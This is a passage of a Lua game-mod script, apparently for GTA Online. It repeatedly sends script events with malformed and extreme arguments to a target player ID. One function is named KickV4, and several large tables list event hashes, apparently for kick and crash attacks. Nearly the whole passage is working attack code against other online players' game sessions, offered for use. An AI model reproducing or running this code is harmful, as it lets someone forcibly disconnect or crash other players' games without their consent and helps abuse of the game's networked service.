        send_script_event(-2120750352, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(3859899904, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(-81613951, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(-1292453789, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(1623637790, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(-1905128202, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(-435067392, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(-2120750352, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(3859899904, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(-81613951, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(-1292453789, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(1623637790, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(-1905128202, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(1160415507, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(154008137, pid, {pid, -1, -1, -1, -1})
        send_script_event(
            154008137,
            pid,
            {
                pid,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10
            }
        )
        send_script_event(154008137, pid, {-1, 0})
        send_script_event(428882541, pid, {pid, -1, -1, -1, -1})
        send_script_event(
            428882541,
            pid,
            {
                pid,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10
            }
        )
        send_script_event(428882541, pid, {-1, 0})
        send_script_event(-1714354434, pid, {pid, -1, -1, -1, -1})
        send_script_event(
            -1714354434,
            pid,
            {
                pid,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10
            }
        )
        send_script_event(-1714354434, pid, {-1, 0})
        send_script_event(-435067392, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(0xF5CB92DB, pid, {0, 0, 46190868, 0, 2})
        send_script_event(0xF5CB92DB, pid, {46190868, 0, 46190868, 46190868, 2})
        send_script_event(0xF5CB92DB, pid, {1337, -1, 1, 1, 0, 0, 0})
        send_script_event(0xF5CB92DB, pid, {pid, 1337, -1, 1, 1, 0, 0, 0})
        send_script_event(0xc5bc4c4b, pid, {-72614, 63007, 59027, -12012, -26996, 33399})
        send_script_event(-2122716210, pid, {91645, -99683, 1788, 60877, 55085, 72028})
        send_script_event(-2120750352, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(0xE6116600, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(-977515445, pid, {-1, 500000, 849451549, -1, -1})
        send_script_event(767605081, pid, {-1, 500000, 849451549, -1, -1})
        send_script_event(-1949011582, pid, {-1139568479, -1, 1, 100099})
        send_script_event(
            -2122716210,
            pid,
            {-1139568479, -1, 1, 100099, -1, 500000, 849451549, -1, -1, 91645, -99683, 1788, 60877, 55085, 72028}
        )
        send_script_event(
            -922075519,
            pid,
            {
                -1,
                -1,
                -1,
                -1,
                -1139568479,
                -1,
                1,
                100099,
                -1,
                500000,
                849451549,
                -1,
                -1,
                91645,
                -99683,
                1788,
                60877,
                55085,
                72028
            }
        )
        send_script_event(
            -1975590661,
            pid,
            {-1139568479, -1, 1, 100099, -1, 500000, 849451549, -1, -1, 91645, -99683, 1788, 60877, 55085, 72028}
        )
        send_script_event(-171207973, pid, {pid, 532165, pid})
        send_script_event(-171207973, pid, {pid, 532165})
        send_script_event(-171207973, pid, {pid, -1, -1, -1, -1})
        send_script_event(
            -171207973,
            pid,
            {
                pid,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10
            }
        )
        send_script_event(-171207973, pid, {-1, 0})
        send_script_event(
            -171207973,
            pid,
            {pid, -1726396442, 428882541, 1, -10, -10, -10, -10, -10, pid, -10, -10, -10}
        )
        send_script_event(-171207973, pid, {pid, 1, -10, -10, -10, -10, -10, pid, -10, -10, -10})
        send_script_event(-171207973, pid, {pid, -1, -1, -1, -1})
        send_script_event(
            -171207973,
            pid,
            {
                pid,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10
            }
        )
        send_script_event(-171207973, pid, {-1, 0})
        send_script_event(-171207973, pid, {pid, -1, -1, -1, -1})
        send_script_event(
            -171207973,
            pid,
            {
                pid,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10
            }
        )
        send_script_event(-171207973, pid, {-1, 0})
        send_script_event(-171207973, pid, {pid, -1, -1, -1, -1})
        send_script_event(
            -171207973,
            pid,
            {
                pid,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10
            }
        )
        send_script_event(-171207973, pid, {-1, 0})
        send_script_event(-171207973, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(-171207973, pid, {pid, -13, -12, -11, -10, 19, pid, 10, 10, 10, 10, -1, -11, -19, -506, 506})
        send_script_event(-171207973, pid, {pid, 532165, pid})
        send_script_event(-171207973, pid, {pid, 532165, pid})
        send_script_event(-171207973, pid, {pid, 532165, pid})
        send_script_event(-171207973, pid, {pid, 532165})
        send_script_event(-171207973, pid, {1, 0})
        send_script_event(-171207973, pid, {0, -1})
        send_script_event(-1212832151, pid, {-1, 0})
        send_script_event(-1212832151, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(-1212832151, pid, {pid, -13, -12, -11, -10, 19, pid, 10, 10, 10, 10, -1, -11, -19, -506, 506})
        send_script_event(-1212832151, pid, {pid, 532165, pid})
        send_script_event(-1212832151, pid, {pid, 532165, pid})
        send_script_event(-1212832151, pid, {pid, 532165, pid})
        send_script_event(-1212832151, pid, {pid, 532165})
        send_script_event(-1212832151, pid, {1, 0})
        send_script_event(-1212832151, pid, {0, -1})
        send_script_event(
            -1212832151,
            pid,
            {
                pid,
                -10000000,
                -10000000,
                -1000000,
                -10000000000,
                -100000,
                -1000000000,
                -10000,
                -10,
                -100,
                -1,
                -10000000000000,
                -10000000,
                -10000000,
                -1000000,
                -1000000,
                -100000,
                -1000000,
                -10,
                -10,
                -10,
                -10,
                -10
            }
        )
        send_script_event(
            -1212832151,
            pid,
            {
                pid,
                -10000000,
                -10000000,
                -1000000,
                -10000000000,
                -100000,
                -1000000000,
                -10000,
                -10,
                -100,
                -1,
                -10000000000000,
                -10000000,
                -10000000,
                -1000000,
                -1000000,
                -100000,
                -1000000,
                -10,
                -10,
                pid,
                -10,
                pid
            }
        )
        send_script_event(-1212832151, pid, {pid, 23048976 + 1 + pid * 595 + 506})
        send_script_event(-1212832151, pid, {pid, 23048976 + 1 + pid * 695 + 507})
        send_script_event(-1212832151, pid, {pid, 1630317 + 1 + pid * 989 + 555})
        send_script_event(-1212832151, pid, {0, 0, 46190868, 0, 2})
        send_script_event(-1212832151, pid, {46190868, 0, 46190868, 46190868, 2})
        send_script_event(-1212832151, pid, {1337, -1, 1, 1, 0, 0, 0})
        send_script_event(-1212832151, pid, {pid, 1337, -1, 1, 1, 0, 0, 0})
        send_script_event(-1212832151, pid, {-72614, 63007, 59027, -12012, -26996, 33399})
        send_script_event(-1212832151, pid, {91645, -99683, 1788, 60877, 55085, 72028})
        send_script_event(-1212832151, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(-1212832151, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(-1212832151, pid, {-1, 500000, 849451549, -1, -1})
        send_script_event(-1212832151, pid, {-1, 500000, 849451549, -1, -1})
        send_script_event(-1212832151, pid, {-1139568479, -1, 1, 100099})
        send_script_event(
            -1212832151,
            pid,
            {-1139568479, -1, 1, 100099, -1, 500000, 849451549, -1, -1, 91645, -99683, 1788, 60877, 55085, 72028}
        )
        send_script_event(
            -1212832151,
            pid,
            {
                -1,
                -1,
                -1,
                -1,
                -1139568479,
                -1,
                1,
                100099,
                -1,
                500000,
                849451549,
                -1,
                -1,
                91645,
                -99683,
                1788,
                60877,
                55085,
                72028
            }
        )
        send_script_event(
            -1212832151,
            pid,
            {-1139568479, -1, 1, 100099, -1, 500000, 849451549, -1, -1, 91645, -99683, 1788, 60877, 55085, 72028}
        )
        send_script_event(1317868303, pid, {pid, 532165, pid})
        send_script_event(1317868303, pid, {pid, 532165})
        send_script_event(1317868303, pid, {pid, -1, -1, -1, -1})
        send_script_event(
            1317868303,
            pid,
            {
                pid,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10
            }
        )
        send_script_event(1317868303, pid, {-1, 0})
        send_script_event(
            1317868303,
            pid,
            {pid, -1726396442, 428882541, 1, -10, -10, -10, -10, -10, pid, -10, -10, -10}
        )
        send_script_event(1317868303, pid, {pid, 1, -10, -10, -10, -10, -10, pid, -10, -10, -10})
        send_script_event(1317868303, pid, {pid, -1, -1, -1, -1})
        send_script_event(
            1317868303,
            pid,
            {
                pid,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10
            }
        )
        send_script_event(1317868303, pid, {-1, 0})
        send_script_event(1317868303, pid, {pid, -1, -1, -1, -1})
        send_script_event(
            1317868303,
            pid,
            {
                pid,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10
            }
        )
        send_script_event(1317868303, pid, {-1, 0})
        send_script_event(1317868303, pid, {pid, -1, -1, -1, -1})
        send_script_event(
            1317868303,
            pid,
            {
                pid,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10
            }
        )
        send_script_event(1317868303, pid, {-1, 0})
        send_script_event(1317868303, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(1317868303, pid, {pid, -13, -12, -11, -10, 19, pid, 10, 10, 10, 10, -1, -11, -19, -506, 506})
        send_script_event(1317868303, pid, {pid, 532165, pid})
        send_script_event(1317868303, pid, {pid, 532165, pid})
        send_script_event(1317868303, pid, {pid, 532165, pid})
        send_script_event(1317868303, pid, {pid, 532165})
        send_script_event(1317868303, pid, {1, 0})
        send_script_event(1317868303, pid, {0, -1})
        send_script_event(
            1317868303,
            pid,
            {
                pid,
                -10000000,
                -10000000,
                -1000000,
                -10000000000,
                -100000,
                -1000000000,
                -10000,
                -10,
                -100,
                -1,
                -10000000000000,
                -10000000,
                -10000000,
                -1000000,
                -1000000,
                -100000,
                -1000000,
                -10,
                -10,
                -10,
                -10,
                -10
            }
        )
        send_script_event(
            1317868303,
            pid,
            {
                pid,
                -10000000,
                -10000000,
                -1000000,
                -10000000000,
                -100000,
                -1000000000,
                -10000,
                -10,
                -100,
                -1,
                -10000000000000,
                -10000000,
                -10000000,
                -1000000,
                -1000000,
                -100000,
                -1000000,
                -10,
                -10,
                pid,
                -10,
                pid
            }
        )
        send_script_event(1317868303, pid, {pid, 23048976 + 1 + pid * 595 + 506})
        send_script_event(1317868303, pid, {pid, 23048976 + 1 + pid * 695 + 507})
        send_script_event(1317868303, pid, {pid, 1630317 + 1 + pid * 989 + 555})
        send_script_event(1317868303, pid, {0, 0, 46190868, 0, 2})
        send_script_event(1317868303, pid, {46190868, 0, 46190868, 46190868, 2})
        send_script_event(1317868303, pid, {1337, -1, 1, 1, 0, 0, 0})
        util.yield(1)
        send_script_event(1317868303, pid, {pid, 1337, -1, 1, 1, 0, 0, 0})
        send_script_event(1317868303, pid, {-72614, 63007, 59027, -12012, -26996, 33399})
        send_script_event(1317868303, pid, {91645, -99683, 1788, 60877, 55085, 72028})
        send_script_event(1317868303, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(1317868303, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(1317868303, pid, {-1, 500000, 849451549, -1, -1})
        send_script_event(1317868303, pid, {-1, 500000, 849451549, -1, -1})
        send_script_event(1317868303, pid, {-1139568479, -1, 1, 100099})
        send_script_event(
            1317868303,
            pid,
            {-1139568479, -1, 1, 100099, -1, 500000, 849451549, -1, -1, 91645, -99683, 1788, 60877, 55085, 72028}
        )
        send_script_event(
            1317868303,
            pid,
            {
                -1,
                -1,
                -1,
                -1,
                -1139568479,
                -1,
                1,
                100099,
                -1,
                500000,
                849451549,
                -1,
                -1,
                91645,
                -99683,
                1788,
                60877,
                55085,
                72028
            }
        )
        send_script_event(
            1317868303,
            pid,
            {-1139568479, -1, 1, 100099, -1, 500000, 849451549, -1, -1, 91645, -99683, 1788, 60877, 55085, 72028}
        )
        send_script_event(-1252906024, pid, {pid, 532165})
        send_script_event(-1252906024, pid, {pid, -1, -1, -1, -1})
        send_script_event(
            -1252906024,
            pid,
            {
                pid,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10
            }
        )
        send_script_event(-1252906024, pid, {-1, 0})
        send_script_event(
            -1252906024,
            pid,
            {pid, -1726396442, 428882541, 1, -10, -10, -10, -10, -10, pid, -10, -10, -10}
        )
        send_script_event(-1252906024, pid, {pid, 1, -10, -10, -10, -10, -10, pid, -10, -10, -10})
        send_script_event(-1252906024, pid, {pid, -1, -1, -1, -1})
        send_script_event(
            -1252906024,
            pid,
            {
                pid,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10
            }
        )
        send_script_event(-1252906024, pid, {-1, 0})
        send_script_event(-1252906024, pid, {pid, -1, -1, -1, -1})
        send_script_event(
            -1252906024,
            pid,
            {
                pid,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10
            }
        )
        send_script_event(-1252906024, pid, {-1, 0})
        send_script_event(-1252906024, pid, {pid, -1, -1, -1, -1})
        send_script_event(
            -1252906024,
            pid,
            {
                pid,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10
            }
        )
        util.yield(10)
    end
end
local a5 = {
    -1212832151,
    1317868303,
    -1252906024,
    -1890951223,
    1428412924,
    699592812,
    1922258436,
    1101235920,
    121406262,
    -1256990787,
    2965958374,
    -1054826273,
    1620254541,
    1401831542,
    2099816323,
    -1491386500,
    -977515445,
    -435067392,
    1347850743,
    -1729804184,
    1881968783,
    -1559754940,
    767605081,
    -442306200,
    733106126,
    -966559987,
    1841943281,
    -2033338628,
    -1243454584,
    1352706024,
    -1990292823,
    -1246838892,
    830707189,
    1119498954,
    -891346918,
    -920663435,
    -1924332863,
    -1549630786,
    1998625272,
    1977655521,
    620255745,
    2017765964,
    1974064500,
    1070934291,
    -345371965,
    -2042143896,
    495824472,
    1159655011,
    -2017629233,
    -1648921703,
    -1333236192,
    -1949011582,
    -720040631,
    -2147483647
}
local a6 = {
    -1949011582,
    1244135940,
    931185764,
    880269514,
    -184087091,
    1120313136,
    -438498801,
    -2135614041,
    -2042143896,
    2017765964,
    1881968783,
    620255745,
    -1054826273,
    -190197401,
    37950012,
    1949047749,
    189426737,
    440451836,
    -1551731308,
    1027640676,
    -1858793976,
    1466961423,
    1919572202,
    1401831542,
    -1999145131,
    402719724,
    1525180252,
    -1756175141,
    1715510245,
    -801305185,
    1097312011,
    1717331426,
    1073357477,
    468940571,
    495824472,
    -2033338628,
    -962064463,
    931219308,
    -1730227041,
    501406112,
    -1042174840,
    314706334,
    1977655521,
    -2122716210,
    -1333236192,
    -620075057,
    -1542610935,
    1967155575,
    74423716,
    -961190199,
    -505351260,
    1217352219,
    877700249,
    639032041,
    -1243454584,
    -116602735,
    2058632186,
    891272013,
    393068387,
    1140870402,
    1101235920,
    -442306200,
    -345371965,
    -1379398115,
    575518757,
    889825697,
    764638896,
    1260307946,
    1430093873,
    550741583,
    858406863,
    1870047677,
    -1249091994,
    -49604647,
    -338445752,
    1302185744,
    -1975590661,
    1066968010,
    735307666,
    -763931968,
    1998625272,
    1723477505,
    206176460,
    -72590627,
    1045342179,
    -374910571,
    1000351374,
    2055893718,
    -599891884,
    -591321928,
    -720040631,
    1115000764,
    543040796,
    -1561698044,
    -1203311834,
    -1662268941,
    475909762,
    193916381,
    1983321563,
    1503747188,
    356132005,
    -1676842684,
    -529143813,
    1176365945,
    -10574121,
    306215142,
    -1740278601,
    -1676913872,
    -982430780,
    -660394610,
    1511186999,
    571133028,
    -1864549087,
    -922075519,
    -1437574346,
    -228458318,
    2131576964,
    177832320,
    1400694109,
    1166120552,
    145559396,
    -2080461139,
    1070934291,
    -1491386500,
    489321898,
    -1633299070,
    -638863591,
    405611573,
    -547753294,
    40168385,
    -1678014630,
    416104391,
    710791216,
    -253630609,
    -730739328,
    -1657159979,
    1570956502,
    -1705723814,
    -1595515659,
    261991583,
    -775470665,
    -1698341613,
    714506292,
    1376408207,
    2142017165,
    -1336925360,
    126014646,
    -1290202385,
    -402069102,
    2053227459,
    -1372360252,
    1006436615,
    547957431,
    809657238,
    -415666077,
    1188873208,
    -1549630786,
    1060402116,
    -504482199,
    89278042,
    1118933262,
    -1990292823,
    1352706024,
    348119077,
    1240791382,
    -948169674,
    2133081418,
    -262341369,
    1000457834,
    -375398087,
    -1329008922,
    1841943281,
    -852503405,
    925173178,
    -1989372325,
    1303708261,
    -1911813629,
    2098987581,
    -865197423,
    -1825953974,
    -921073084,
    156856405,
    -2060629306,
    262768112,
    421494533,
    1755988437,
    -1493184845,
    -1657017550,
    -577286683,
    465570678,
    -1632172694,
    1972484238,
    14345383,
    743968101,
    599029146,
    962465625,
    960916034,
    -1459006650,
    778805747,
    -1580390976,
    823645419,
    -2065346036,
    1213808185,
    67004146,
    582648726,
    -1031098030,
    -1295633605,
    614999494,
    -791577348,
    1294893057,
    -171207973,
    -568266702,
    1212829040,
    1345577858,
    767605081,
    -977515445,
    -365271546,
    -455354067,
    -1174459121,
    1096684293,
    -1497250740,
    -911939009,
    1347850743,
    -920663435,
    -1057419833,
    -1596113101,
    -1759105725,
    -1336932351,
    -1648921703,
    -1437387234,
    2062282408,
    1692477431,
    1553508941,
    699592812,
    1417613287,
    -2029779863,
    1596100569,
    392501634,
    -909357184,
    -1442614028,
    171064260,
    -152440739,
    -1353116588,
    835608275,
    1307476082,
    -345908092,
    1365604007,
    1280085963,
    -612371672,
    -1488631377,
    -1720012585,
    -2042475657,
    -240257097,
    1240585650,
    1192658057,
    243540311,
    1191422458,
    -627821011,
    1129105265,
    1767220965,
    1664114676,
    -1032273438,
    1665678974,
    -1544167759,
    -87967637,
    -891346918,
    -1729804184,
    -1882923979,
    793694002,
    -158787995,
    1620254541,
    1428412924,
    -1713165973,
    -1212832151,
    87315576,
    635120817,
    275957394,
    -707133706,
    1623717033,
    420011712,
    -738295409,
    1665839162,
    -131274930,
    150294028,
    992970225,
    -551637263,
    603010792,
    -813003734,
    584503478,
    -355297939,
    -1789621123,
    -338399516,
    1317868303,
    1119498954,
    -1162153263,
    1974064500,
    1699621593,
    1300962917,
    1410801811,
    -647202696,
    -966559987,
    1509139352,
    1437305856,
    -1564435822,
    765000166,
    2099816323,
    1310197925,
    -542139175,
    511933636,
    127054992,
    741525574,
    473998728,
    1642731136,
    2026253606,
    -1245024507,
    1394622857,
    814210644,
    356369059,
    -1185075112,
    1996378932,
    -743046526,
    -1014199946,
    474621183,
    1901047756,
    1644907640,
    -1840682990,
    1843603007,
    483883516,
    -1191687050,
    733106126,
    417206566,
    -962439346,
    -545396442,
    53977718,
    830707189,
    1198154717,
    -1890951223,
    -1252906024,
    -1559754940,
    665709549,
    1922258436,
    -435067392,
    324865135,
    331283186,
    -363435150,
    1325156823,
    1483710319,
    -496432604,
    -727492889,
    194342417,
    -1406618481,
    -1879618040,
    -1080429176,
    -416183945,
    -1455659794,
    -1212832151,
    1317868303,
    -1252906024,
    -1890951223,
    1428412924,
    699592812,
    1922258436,
    1101235920,
    121406262,
    -1256990787,
    2965958374,
    -1054826273,
    1620254541,
    1401831542,
    2099816323,
    -1491386500,
    -977515445,
    -435067392,
    1347850743,
    -1729804184,
    1881968783,
    -1559754940,
    767605081,
    -442306200,
    733106126,
    -966559987,
    1841943281,
    -2033338628,
    -1243454584,
    1352706024,
    -1990292823,
    -1246838892,
    830707189,
    1119498954,
    -891346918,
    -920663435,
    -1924332863,
    -1549630786,
    1998625272,
    1977655521,
    620255745,
    2017765964,
    1974064500,
    1070934291,
    -345371965,
    -2042143896,
    495824472,
    1159655011,
    -2017629233,
    -1648921703,
    -1333236192,
    -1949011582,
    -720040631,
    -2147483647
}
local a7 = {
    -1949011582,
    1244135940,
    931185764,
    880269514,
    -184087091,
    1120313136,
    -438498801,
    -2135614041,
    -2042143896,
    2017765964,
    1881968783,
    620255745,
    -1054826273,
    -190197401,
    37950012,
    1949047749,
    189426737,
    440451836,
    -1551731308,
    1027640676,
    -1858793976,
    1466961423,
    1919572202,
    1401831542,
    -1999145131,
    402719724,
    1525180252,
    -1756175141,
    1715510245,
    -801305185,
    1097312011,
    1717331426,
    1073357477,
    468940571,
    495824472,
    -2033338628,
    -962064463,
    931219308,
    -1730227041,
    501406112,
    -1042174840,
    314706334,
    1977655521,
    -2122716210,
    -1333236192,
    -620075057,
    -1542610935,
    1967155575,
    74423716,
    -961190199,
    -505351260,
    1217352219,
    877700249,
    639032041,
    -1243454584,
    -116602735,
    2058632186,
    891272013,
    393068387,
    1140870402,
    1101235920,
    -442306200,
    -345371965,
    -1379398115,
    575518757,
    889825697,
    764638896,
    1260307946,
    1430093873,
    550741583,
    858406863,
    1870047677,
    -1249091994,
    -49604647,
    -338445752,
    1302185744,
    -1975590661,
    1066968010,
    735307666,
    -763931968,
    1998625272,
    1723477505,
    206176460,
    -72590627,
    1045342179,
    -374910571,
    1000351374,
    2055893718,
    -599891884,
    -591321928,
    -720040631,
    1115000764,
    543040796,
    -1561698044,
    -1203311834,
    -1662268941,
    475909762,
    193916381,
    1983321563,
    1503747188,
    356132005,
    -1676842684,
    -529143813,
    1176365945,
    -10574121,
    306215142,
    -1740278601,
    -1676913872,
    -982430780,
    -660394610,
    1511186999,
    571133028,
    -1864549087,
    -922075519,
    -1437574346,
    -228458318,
    2131576964,
    177832320,
    1400694109,
    1166120552,
    145559396,
    -2080461139,
    1070934291,
    -1491386500,
    489321898,
    -1633299070,
    -638863591,
    405611573,
    -547753294,
    40168385,
    -1678014630,
    416104391,
    710791216,
    -253630609,
    -730739328,
    -1657159979,
    1570956502,
    -1705723814,
    -1595515659,
    261991583,
    -775470665,
    -1698341613,
    714506292,
    1376408207,
    2142017165,
    -1336925360,
    126014646,
    -1290202385,
    -402069102,
    2053227459,
    -1372360252,
    1006436615,
    547957431,
    809657238,
    -415666077,
    1188873208,
    -1549630786,
    1060402116,
    -504482199,
    89278042,
    1118933262,
    -1990292823,
    1352706024,
    348119077,
    1240791382,
    -948169674,
    2133081418,
    -262341369,
    1000457834,
    -375398087,
    -1329008922,
    1841943281,
    -852503405,
    925173178,
    -1989372325,
    1303708261,
    -1911813629,
    2098987581,
    -865197423,
    -1825953974,
    -921073084,
    156856405,
    -2060629306,
    262768112,
    421494533,
    1755988437,
    -1493184845,
    -1657017550,
    -577286683,
    465570678,
    -1632172694,
    1972484238,
    14345383,
    743968101,
    599029146,
    962465625,
    960916034,
    -1459006650,
    778805747,
    -1580390976,
    823645419,
    -2065346036,
    1213808185,
    67004146,
    582648726,
    -1031098030,
    -1295633605,
    614999494,
    -791577348,
    1294893057,
    -171207973,
    -568266702,
    1212829040,
    1345577858,
    767605081,
    -977515445,
    -365271546,
    -455354067,
    -1174459121,
    1096684293,
    -1497250740,
    -911939009,
    1347850743,
    -920663435,
    -1057419833,
    -1596113101,
    -1759105725,
    -1336932351,
    -1648921703,
    -1437387234,
    2062282408,
    1692477431,
    1553508941,
    699592812,
    1417613287,
    -2029779863,
    1596100569,
    392501634,
    -909357184,
    -1442614028,
    171064260,
    -152440739,
    -1353116588,
    835608275,
    1307476082,
    -345908092,
    1365604007,
    1280085963,
    -612371672,
    -1488631377,
    -1720012585,
    -2042475657,
    -240257097,
    1240585650,
    1192658057,
    243540311,
    1191422458,
    -627821011,
    1129105265,
    1767220965,
    1664114676,
    -1032273438,
    1665678974,
    -1544167759,
    -87967637,
    -891346918,
    -1729804184,
    -1882923979,
    793694002,
    -158787995,
    1620254541,
    1428412924,
    -1713165973,
    -1212832151,
    87315576,
    635120817,
    275957394,
    -707133706,
    1623717033,
    420011712,
    -738295409,
    1665839162,
    -131274930,
    150294028,
    992970225,
    -551637263,
    603010792,
    -813003734,
    584503478,
    -355297939,
    -1789621123,
    -338399516,
    1317868303,
    1119498954,
    -1162153263,
    1974064500,
    1699621593,
    1300962917,
    1410801811,
    -647202696,
    -966559987,
    1509139352,
    1437305856,
    -1564435822,
    765000166,
    2099816323,
    1310197925,
    -542139175,
    511933636,
    127054992,
    741525574,
    473998728,
    1642731136,
    2026253606,
    -1245024507,
    1394622857,
    814210644,
    356369059,
    -1185075112,
    1996378932,
    -743046526,
    -1014199946,
    474621183,
    1901047756,
    1644907640,
    -1840682990,
    1843603007,
    483883516,
    -1191687050,
    733106126,
    417206566,
    -962439346,
    -545396442,
    53977718,
    830707189,
    1198154717,
    -1890951223,
    -1252906024,
    -1559754940,
    665709549,
    1922258436,
    -435067392,
    324865135,
    331283186,
    -363435150,
    1325156823,
    1483710319,
    -496432604,
    -727492889,
    194342417,
    -1406618481,
    -1879618040,
    -1080429176,
    -416183945,
    -1455659794
}
local a8 = {
    495824472,
    -1949011582,
    -1730227041,
    -1882923979,
    -1252906024,
    -1559754940,
    -1054826273,
    -435067392,
    -442306200,
    1352706024,
    -1890951223,
    -966559987,
    -1990292823,
    1428412924,
    -1212832151,
    -2033338628,
    -1243454584,
    -1729804184,
    -920663435,
    -1549630786,
    1998625272,
    1977655521,
    2017765964,
    1070934291,
    -345371965,
    -2042143896,
    1347850743,
    -1580390976,
    -1491386500,
    823645419,
    1317868303,
    1620254541,
    1401831542,
    1881968783
}
function KickV4(pid, a1)
    for U = 1, a1 do
        send_script_event(-2120750352, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(3859899904, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(3328407309, pid, {55963135, 56512451, 1820116286, 0, 0})
        send_script_event(3240141023, pid, {4266445567, 74, 1816446214})
        send_script_event(2565163112, pid, {91436768, 4244161632, 1816839436, 139, 1})
        send_script_event(3328407309, pid, {55963135, 56512451, 1812251974, 674298504, 0})
        send_script_event(3240141023, pid, {4266445567, 74, 1815135562})
        send_script_event(2565163112, pid, {91436768, 4244161632, 1819591990, 466, 2324838480})
        send_script_event(3328407309, pid, {55963135, 56512451, 1816839436, 139, 1})
        send_script_event(3240141023, pid, {4266445567, 2324837584, 1817494806})
        send_script_event(2565163112, pid, {91436768, 4244161632, 1823000034, 69, 103})
        send_script_event(3328407309, pid, {55963135, 56512451, 1816184090, 69, 103})
        send_script_event(3240141023, pid, {4266445567, 104, 1819854130})
        send_script_event(2565163112, pid, {91436768, 4244161632, 1818412324, 3, 0})
        send_script_event(3328407309, pid, {55963135, 56512451, 1819591990, 25, 48})
        send_script_event(3240141023, pid, {4266445567, 56512451, 1816839436})
        send_script_event(3240141023, pid, {4266445567, 56512451, 1816839436})
        send_script_event(2565163112, pid, {91436768, 4244161632, 1815659890, 3, 0})
        send_script_event(23328407309, pid, {55963135, 56512451, 1813038378, 69, 103})
        send_script_event(3240141023, pid, {4266445567, 74, 1812383040})
        send_script_event(2565163112, pid, {91436768, 4244161632, 1812645196, 713476592, 0})
        send_script_event(3328407309, pid, {55963135, 56512451, 1813431632, 25, 48})
        send_script_event(3240141023, pid, {4266445567, 104, 1817888028})
        send_script_event(2565163112, pid, {91436768, 4244161632, 1815135562, 25, 48})
        send_script_event(3328407309, pid, {55963135, 56512451, 1823262190, 674298504, 0})
        send_script_event(3240141023, pid, {4266445567, 104, 1817101576})
